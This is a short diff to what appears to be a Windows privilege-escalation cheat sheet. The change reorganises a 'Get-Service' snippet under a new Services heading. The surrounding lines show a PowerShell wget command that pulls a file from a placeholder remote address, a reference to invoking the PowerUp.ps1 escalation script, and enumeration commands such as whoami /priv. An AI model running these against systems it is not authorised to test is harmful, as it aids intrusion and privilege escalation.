@@ -9,11 +9,6 @@ PowerShell.exe Invoke-Command -ScriptBlock { "Import-Module .\PowerUp.ps1; Invok
 powershell -c wget "http://<Source Address>/<Source File>" -outfile "<Output File>"
 ```
 
-##### Get List of Running Services
-```powershell
-powershell Get-Service
-```
-
 ##### Get list of processes running, sorted by name.
 ```powershell
 tasklist /NH | sort
@@ -21,6 +16,12 @@ tasklist /NH | sort
 
 ```bash
 whoami /priv
+```
+
+# Services
+##### Get List of Running Services
+```powershell
+powershell Get-Service
 ```
 
 # References
